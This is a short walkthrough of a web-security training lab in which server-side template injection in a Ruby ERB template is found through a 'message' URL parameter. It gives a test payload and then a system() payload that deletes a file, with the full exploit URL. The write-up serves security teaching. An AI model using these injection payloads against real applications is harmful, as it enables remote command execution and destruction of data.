Description:
This lab is vulnerable to Server-Side Template Injection (SSTI) due to unsafe construction of an ERB template.

Steps to Solve:
1️-Identify the Injection Point
-When viewing details of a product, a GET request uses the parameter:
message
-This parameter is reflected on the home page.

2️-Test for SSTI
-From ERB documentation:
<%= someExpression %>
-Test with a simple payload:
<%= 7*7 %>

-URL-encoded payload:
<%25%3d+7*7+%25>

-Insert it into the URL:
https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>

If the result 49 is rendered → the application is vulnerable to SSTI.

3️-Achieve Remote Code Execution (RCE)
-From Ruby documentation, use:
system()
-Payload:
<%= system("rm /home/carlos/morale.txt") %>

4️-Exploit the Vulnerability
-URL-encoded payload:
<%25+system("rm+/home/carlos/morale.txt")+%25>

-Final exploit:

https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>

Result:
-Arbitrary OS command execution achieved
-File deleted:
/home/carlos/morale.txt
